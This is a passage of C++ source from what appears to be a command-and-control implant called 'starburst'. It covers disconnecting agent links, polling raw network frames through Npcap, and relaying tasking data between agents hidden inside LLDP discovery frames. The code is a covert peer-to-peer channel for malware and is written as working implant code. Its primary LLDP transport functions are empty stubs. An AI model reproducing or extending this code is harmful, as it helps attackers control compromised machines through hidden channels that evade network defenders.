            DBG_PRINT( inst, "lldp_disconnect: removed id=%d agent=%s\n",
                cur->link_id, cur->agent_id );

            /* queue ACTION_LINK_REMOVE */
            auto pkg = package_create( inst );
            if ( pkg ) {
                package_add_byte( inst, pkg, ACTION_LINK_REMOVE );
                package_add_int32( inst, pkg, cur->link_id );
                package_add_string( inst, pkg, cur->agent_id );

                uint32_t pkg_len = 0;
                auto pkg_data = package_build( pkg, &pkg_len );
                lldp_queue_raw( inst, pkg_data, pkg_len );
                package_destroy( inst, pkg );
            }

            if ( cur->agent_id ) inst.heap_free( cur->agent_id );
            inst.heap_free( cur );

            found = true;
            break;
        }
        prev = cur;
        cur  = cur->next;
    }

    if ( found ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "LLDP link disconnected" ) ) );
    } else {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "LLDP link not found" ) ) );
    }
}

#endif /* INCLUDE_CMD_LLDP_DISCONNECT */

/* ================================================================
 *  LLDP LINK POLLING
 * ================================================================ */

#if defined( INCLUDE_CMD_LLDP_CONNECT ) || defined( INCLUDE_CMD_LLDP_DISCONNECT ) || defined( LLDP_TRANSPORT )

auto declfn starburst::lldp_poll_links(
    _Inout_ instance& inst
) -> void {
    auto state = static_cast<LldpLinkState*>( inst.lldp_link_state );
    if ( !state || !state->initialized || !state->pcap_handle ) return;

    uint32_t pkts = 0;

    while ( pkts < MAX_LLDP_PKTS_PER_LOOP ) {
        lldp_pcap_pkthdr* pkt_hdr  = nullptr;
        const uint8_t*    pkt_data = nullptr;

        int ret = state->npcap.pNextEx( state->pcap_handle, &pkt_hdr, &pkt_data );
        if ( ret == 0 ) break;
        if ( ret < 0 ) break;

        if ( !pkt_hdr || !pkt_data || pkt_hdr->caplen < 14 ) continue;

        uint8_t peer_mac[6];
        LldpParsedChunk parsed[LLDP_MAX_TLVS_PER_FRAME];
        int nchunks = lldp_parse_frame_multi(
            const_cast<uint8_t*>( pkt_data ), pkt_hdr->caplen,
            state->oui, state->subtype, peer_mac, parsed, LLDP_MAX_TLVS_PER_FRAME );
        if ( nchunks <= 0 ) continue;

        if ( memory::compare( peer_mac, state->src_mac, 6 ) == 0 )
            continue;

        auto cur = inst.lldp_links;
        instance::LldpLink* link = nullptr;
        while ( cur ) {
            if ( cur->connected &&
                 memory::compare( cur->peer_mac, peer_mac, 6 ) == 0 ) {
                link = cur;
                break;
            }
            cur = cur->next;
        }

        if ( !link ) continue;

        for ( int ci = 0; ci < nchunks; ci++ ) {
            uint16_t total    = parsed[ci].total;
            uint16_t seq_no   = parsed[ci].seq_no;
            uint16_t chunk_len = parsed[ci].data_len;

            if ( total == 1 && seq_no == 0 && chunk_len > 0 ) {

                if ( chunk_len >= 48 && link->agent_id ) {
                    uint32_t dec_len = 0;
                    auto dec = base64_decode( inst, parsed[ci].data, 48, &dec_len );
                    if ( dec && dec_len >= 36 ) {
                        if ( str_ncmp( link->agent_id,
                                       reinterpret_cast<char*>( dec ), 36 ) != 0 ) {
                            auto nid = static_cast<char*>( inst.heap_alloc( 37 ) );
                            if ( nid ) {
                                memory::copy( nid, dec, 36 );
                                nid[36] = '\0';
                                inst.heap_free( link->agent_id );
                                link->agent_id = nid;
                            }
                        }
                        inst.heap_free( dec );
                    } else if ( dec ) {
                        inst.heap_free( dec );
                    }
                }

                auto dpkg = package_create( inst );
                if ( dpkg ) {
                    package_add_byte( inst, dpkg, ACTION_LINK_MSG );
                    package_add_string( inst, dpkg, link->agent_id ?
                        link->agent_id : symbol<char*>( const_cast<char*>( "" ) ) );
                    package_add_bytes( inst, dpkg, parsed[ci].data, chunk_len );

                    uint32_t dlen = 0;
                    auto ddata = package_build( dpkg, &dlen );
                    lldp_queue_raw( inst, ddata, dlen );
                    package_destroy( inst, dpkg );
                }
            }
        }

        pkts++;
    }
}

auto declfn starburst::lldp_link_send_msg(
    _Inout_ instance&            inst,
    _In_    instance::LldpLink*  link,
    _In_    uint8_t*             data,
    _In_    uint32_t             len
) -> bool {
    auto state = static_cast<LldpLinkState*>( inst.lldp_link_state );
    if ( !state || !state->initialized || !state->pcap_handle ) return false;
    return lldp_send_data( inst, state, link->peer_mac, data, len ) == 0;
}

#endif

/* ================================================================
 *  LLDP PRIMARY TRANSPORT (P2P child agent)
 * ================================================================ */

#if defined( LLDP_TRANSPORT )

namespace starburst {

auto declfn lldp_init( instance& inst ) -> bool {
    return false;
}

auto declfn lldp_send(
    instance& inst,
    uint8_t*  data,
    uint32_t  len,
    uint8_t** response,
    uint32_t* resp_len
) -> bool {
    return false;
}

auto declfn lldp_destroy( instance& inst ) -> void {
}

} // namespace starburst

#endif /* LLDP_TRANSPORT */
